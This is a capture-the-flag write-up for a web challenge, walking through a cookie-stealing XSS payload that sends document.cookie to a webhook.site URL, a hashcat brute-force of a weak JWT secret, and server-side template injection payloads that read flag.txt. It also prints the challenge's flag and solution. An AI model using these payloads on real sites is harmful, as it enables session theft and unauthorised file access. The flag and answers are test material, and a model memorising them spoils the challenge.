# FatherBoat (Web) \n
Difficulty: Hard \n
Solves: 0 :< \n
Link: http://139.59.124.129:51000/

Intended Solution:
1. XSS
  Payload: `<script>fetch("https://webhook.site/unique-id/?c="+document.cookie)</script>`
  Explanation: The website tells us that one requires approval from the admin to post a story. Instead of getting approval from the admin, one can instead be the admin and thus bypass the approval process, especially since the admin seems to be sleeping/braindead. XSS is possible here as the story of the user is injected directly into the HTML DOM. The cookie is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.OqbksdUdBezk8bCqbh7wJOBuHFIKGoKGkdbAiu9SiJk`
2. Hashcat
  Payload: `./hashcat.exe -a 3 -m 16500 ./.hash --increment ?l?l?l?l?l?l`
  Explanation: After obtaining the token from the admin and checking it out with jwt.io, it seems like even the admin isn't an admin, which sucks tbh. (blame it on the dev) So we have to crack the JWT secret. Luckily for us, the secret isn't very long, so it can be cracked easily using Hashcat (6 lowercase chars). The key is "father".
3. SSTI
  Payload: `{{get_file('flag.txt')}}`
  Explanation: After verifying ourselves as the admin, we can successfully submit stories. However, upon submitting a story, the website prompts us that "Server-side story sharing" has yet to be implemented. This is a direct hint towards Server Side Template Injection (SSTI), so one can test for possible SSTI with ``{{7*7}} or {{7*'7'}}``. Then at a loss of what exactly to do, one might attempt `{{config.items()}}` and stumble upon 2 important key-value pairs: `('BUILT_IN', 'get_file()'), ('FLAG', 'flag.txt')`. Afterwards it's easy, just `{{get_file('flag.txt')}}` to get the flag, `ACSI{gr4ndf4th3r_v3ssel}`.
